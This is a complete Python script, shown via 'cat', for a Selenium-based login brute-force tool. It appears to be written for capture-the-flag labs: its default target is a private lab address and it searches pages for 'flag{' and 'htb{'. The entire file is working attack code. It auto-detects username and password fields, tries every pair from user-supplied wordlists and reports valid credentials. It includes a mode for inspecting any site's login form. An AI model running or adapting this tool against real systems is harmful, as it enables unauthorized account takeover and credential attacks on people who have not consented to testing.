cat brute_force.py 
#!/usr/bin/env python3

import argparse
import sys
import os
import subprocess

def setup_environment():
    """Setup virtual environment and install dependencies"""
    script_dir = os.path.dirname(os.path.abspath(__file__))
    venv_dir = os.path.join(script_dir, 'venv')
    venv_python = os.path.join(venv_dir, 'bin', 'python3')
    venv_pip = os.path.join(venv_dir, 'bin', 'pip')
    
    print("[*] Checking environment setup...")
    
    # Check if venv exists
    if not os.path.exists(venv_dir):
        print("[*] Virtual environment not found. Creating...")
        try:
            subprocess.run([sys.executable, '-m', 'venv', venv_dir], check=True)
            print("[+] Virtual environment created")
        except subprocess.CalledProcessError:
            print("[!] Failed to create virtual environment")
            sys.exit(1)
    
    # Check if selenium is installed in venv
    try:
        result = subprocess.run(
            [venv_python, '-c', 'import selenium'],
            capture_output=True,
            text=True
        )
        
        if result.returncode != 0:
            print("[*] Installing Selenium...")
            subprocess.run([venv_pip, 'install', '-q', 'selenium'], check=True)
            print("[+] Selenium installed")
    except subprocess.CalledProcessError:
        print("[!] Failed to install dependencies")
        sys.exit(1)
    
    # Check if currently running in venv
    in_venv = hasattr(sys, 'real_prefix') or (hasattr(sys, 'base_prefix') and sys.base_prefix != sys.prefix)
    
    if not in_venv:
        print("[*] Restarting script in virtual environment...")
        print("")
        # Re-execute script with venv python
        os.execv(venv_python, [venv_python] + sys.argv)
    
    print("[+] Environment ready")
    print("")

# Check for Selenium installation
try:
    from selenium import webdriver
    from selenium.webdriver.common.by import By
    from selenium.webdriver.support.ui import WebDriverWait
    from selenium.webdriver.support import expected_conditions as EC
    from selenium.common.exceptions import TimeoutException, NoSuchElementException
except ImportError as e:
    # This will trigger the setup on first run
    pass

import time

def setup_driver():
    """Initialize and configure the Selenium WebDriver"""
    options = webdriver.FirefoxOptions()
    options.add_argument('--headless')  # Run in headless mode
    options.add_argument('--no-sandbox')
    options.add_argument('--disable-dev-shm-usage')
    
    try:
        driver = webdriver.Firefox(options=options)
        return driver
    except Exception as e:
        print(f"[!] Error initializing Firefox driver: {e}")
        print("[*] Trying Chrome driver...")
        try:
            chrome_options = webdriver.ChromeOptions()
            chrome_options.add_argument('--headless')
            chrome_options.add_argument('--no-sandbox')
            chrome_options.add_argument('--disable-dev-shm-usage')
            driver = webdriver.Chrome(options=chrome_options)
            return driver
        except Exception as e:
            print(f"[!] Error initializing Chrome driver: {e}")
            sys.exit(1)

def read_file(filepath):
    """Read usernames or passwords from file"""
    try:
        with open(filepath, 'r') as f:
            return [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"[!] Error: File '{filepath}' not found")
        sys.exit(1)
    except Exception as e:
        print(f"[!] Error reading file '{filepath}': {e}")
        sys.exit(1)

def inspect_form(url):
    """Inspect the login form and display all form fields"""
    print(f"[*] Inspecting form at {url}")
    print("[*] Initializing browser...")
    
    driver = setup_driver()
    
    try:
        driver.get(url)
        time.sleep(1)
        
        # Find all forms
        forms = driver.find_elements(By.TAG_NAME, 'form')
        print(f"\n[+] Found {len(forms)} form(s)\n")
        
        for idx, form in enumerate(forms, 1):
            print(f"{'='*60}")
            print(f"Form #{idx}")
            print(f"{'='*60}")
            
            # Find all input fields in this form
            inputs = form.find_elements(By.TAG_NAME, 'input')
            
            if inputs:
                print("\nInput Fields:")
                for input_field in inputs:
                    field_type = input_field.get_attribute('type') or 'text'
                    field_name = input_field.get_attribute('name') or 'N/A'
                    field_id = input_field.get_attribute('id') or 'N/A'
                    field_placeholder = input_field.get_attribute('placeholder') or 'N/A'
                    
                    print(f"  - Type: {field_type:12} | Name: {field_name:15} | ID: {field_id:15} | Placeholder: {field_placeholder}")
            
            # Find buttons
            buttons = form.find_elements(By.TAG_NAME, 'button')
            submit_inputs = form.find_elements(By.CSS_SELECTOR, 'input[type="submit"]')
            
            all_buttons = buttons + submit_inputs
            if all_buttons:
                print("\nButtons:")
                for button in all_buttons:
                    btn_type = button.get_attribute('type') or 'button'
                    btn_text = button.text or button.get_attribute('value') or 'N/A'
                    btn_name = button.get_attribute('name') or 'N/A'
                    btn_id = button.get_attribute('id') or 'N/A'
                    
                    print(f"  - Type: {btn_type:12} | Name: {btn_name:15} | ID: {btn_id:15} | Text: {btn_text}")
            
            print("")
        
        print("\n[*] Inspection complete. Use the field names/IDs with --username-field and --password-field flags")
        print("[*] Example: python3 brute_force.py --username-field user_login --password-field user_pass ...")
        
    finally:
        driver.quit()

def attempt_login(driver, url, username, password, username_selector=None, password_selector=None):
    """Attempt to login with given credentials"""
    try:
        driver.get(url)
        
        # Wait for page to load
        time.sleep(0.5)
        
        # Find username and password fields (common names/ids)
        username_field = None
        password_field = None
        
        # If custom selectors provided, use them
        if username_selector:
            try:
                # Try as name first
                username_field = driver.find_element(By.NAME, username_selector)
            except NoSuchElementException:
                try:
                    # Try as ID
                    username_field = driver.find_element(By.ID, username_selector)
                except NoSuchElementException:
                    try:
                        # Try as CSS selector
                        username_field = driver.find_element(By.CSS_SELECTOR, username_selector)
                    except NoSuchElementException:
                        pass
        
        # If not found with custom selector or no custom selector, try common identifiers
        if not username_field:
            for identifier in ['username', 'user', 'login', 'email', 'uname']:
                try:
                    username_field = driver.find_element(By.NAME, identifier)
                    break
                except NoSuchElementException:
                    try:
                        username_field = driver.find_element(By.ID, identifier)
                        break
                    except NoSuchElementException:
                        continue
        
        # If still not found, try to find input type text
        if not username_field:
            try:
                username_field = driver.find_element(By.CSS_SELECTOR, 'input[type="text"]')
            except NoSuchElementException:
                pass
        
        # If custom password selector provided, use it
        if password_selector:
            try:
                # Try as name first
                password_field = driver.find_element(By.NAME, password_selector)
            except NoSuchElementException:
                try:
                    # Try as ID
                    password_field = driver.find_element(By.ID, password_selector)
                except NoSuchElementException:
                    try:
                        # Try as CSS selector
                        password_field = driver.find_element(By.CSS_SELECTOR, password_selector)
                    except NoSuchElementException:
                        pass
        
        # If not found with custom selector or no custom selector, try common identifiers
        if not password_field:
            for identifier in ['password', 'pass', 'pwd']:
                try:
                    password_field = driver.find_element(By.NAME, identifier)
                    break
                except NoSuchElementException:
                    try:
                        password_field = driver.find_element(By.ID, identifier)
                        break
                    except NoSuchElementException:
                        continue
        
        # If still not found, find input type password
        if not password_field:
            try:
                password_field = driver.find_element(By.CSS_SELECTOR, 'input[type="password"]')
            except NoSuchElementException:
                pass
        
        if not username_field or not password_field:
            print("[!] Could not locate login form fields")
            return False, "Form fields not found"
        
        # Clear fields and enter credentials
        username_field.clear()
        password_field.clear()
        username_field.send_keys(username)
        password_field.send_keys(password)
        
        # Find and click submit button
        submit_button = None
        try:
            submit_button = driver.find_element(By.CSS_SELECTOR, 'input[type="submit"]')
        except NoSuchElementException:
            try:
                submit_button = driver.find_element(By.CSS_SELECTOR, 'button[type="submit"]')
            except NoSuchElementException:
                try:
                    submit_button = driver.find_element(By.XPATH, '//button[contains(text(), "Login") or contains(text(), "Submit")]')
                except NoSuchElementException:
                    pass
        
        if submit_button:
            submit_button.click()
        else:
            # Try submitting the form directly
            password_field.submit()
        
        # Wait for response
        time.sleep(1)
        
        # Check for success indicators
        current_url = driver.current_url
        page_source = driver.page_source.lower()
        
        # Common success indicators
        success_indicators = [
            'welcome',
            'dashboard',
            'logout',
            'success',
            'flag{',
            'htb{',
            'congratulations'
        ]
        
        # Common failure indicators
        failure_indicators = [
            'invalid',
            'incorrect',
            'failed',
            'wrong',
            'error'
        ]
        
        # Check if URL changed (might indicate successful login)
        url_changed = current_url != url
        
        # Check for success/failure indicators
        has_success = any(indicator in page_source for indicator in success_indicators)
        has_failure = any(indicator in page_source for indicator in failure_indicators)
        
        if has_success or (url_changed and not has_failure):
            return True, page_source
        else:
            return False, None
            
    except Exception as e:
        return False, str(e)

def brute_force(url, userfile, passfile, username_selector=None, password_selector=None):
    """Main brute force function"""
    print(f"[*] Starting brute force attack on {url}")
    print(f"[*] Loading usernames from: {userfile}")
    print(f"[*] Loading passwords from: {passfile}")
    
    if username_selector:
        print(f"[*] Using custom username selector: {username_selector}")
    if password_selector:
        print(f"[*] Using custom password selector: {password_selector}")
    
    usernames = read_file(userfile)
    passwords = read_file(passfile)
    
    print(f"[*] Loaded {len(usernames)} usernames and {len(passwords)} passwords")
    print(f"[*] Total attempts: {len(usernames) * len(passwords)}")
    print("[*] Initializing browser...")
    
    driver = setup_driver()
    attempt_count = 0
    
    try:
        for username in usernames:
            for password in passwords:
                attempt_count += 1
                print(f"[{attempt_count}] Trying {username}:{password}", end=' ')
                
                success, response = attempt_login(driver, url, username, password, username_selector, password_selector)
                
                if success:
                    print("✓ SUCCESS!")
                    print(f"\n{'='*60}")
                    print(f"[+] Valid credentials found!")
                    print(f"[+] Username: {username}")
                    print(f"[+] Password: {password}")
                    print(f"{'='*60}\n")
                    
                    # Look for flag in response
                    if response and ('flag{' in response.lower() or 'htb{' in response.lower()):
                        print("[*] Page content may contain a flag:")
                        print(response[:1000])  # Print first 1000 chars
                    
                    return True
                else:
                    print("✗")
                
                time.sleep(0.5)  # Small delay to avoid overwhelming the server
        
        print("\n[!] No valid credentials found")
        return False
        
    except KeyboardInterrupt:
        print("\n[!] Attack interrupted by user")
        return False
    finally:
        driver.quit()
        print("[*] Browser closed")

def main():
    # Setup environment (venv + dependencies)
    setup_environment()
    
    parser = argparse.ArgumentParser(
        description='Selenium-based login brute force tool',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='''
Examples:
  # Inspect form fields
  python3 brute_force.py --url http://target.com/login --inspect
  
  # Basic brute force
  python3 brute_force.py --url http://target.com/login --userfile users.txt --passfile pass.txt
  
  # With custom field selectors
  python3 brute_force.py --userfile users.txt --passfile pass.txt --username-field user_login --password-field user_pass
        '''
    )
    
    parser.add_argument('--url', 
                        default='http://10.82.151.112/labs/lab1/',
                        help='Target URL (default: http://10.82.151.112/labs/lab1/)')
    parser.add_argument('--inspect',
                        action='store_true',
                        help='Inspect the login form to identify field names and IDs')
    parser.add_argument('--userfile', 
                        help='File containing usernames (one per line)')
    parser.add_argument('--passfile', 
                        help='File containing passwords (one per line)')
    parser.add_argument('--username-field',
                        dest='username_field',
                        help='Custom username field name, ID, or CSS selector')
    parser.add_argument('--password-field',
                        dest='password_field',
                        help='Custom password field name, ID, or CSS selector')
    
    args = parser.parse_args()
    
    print("""
    ╔════════════════════════════════════════╗
    ║   Selenium Login Brute Force Tool     ║
    ╚════════════════════════════════════════╝
    """)
    
    # If inspect mode, just inspect the form and exit
    if args.inspect:
        inspect_form(args.url)
        return
    
    # Validate required arguments for brute force mode
    if not args.userfile or not args.passfile:
        parser.error('--userfile and --passfile are required for brute force mode')
    
    brute_force(args.url, args.userfile, args.passfile, args.username_field, args.password_field)

if __name__ == '__main__':
    main()
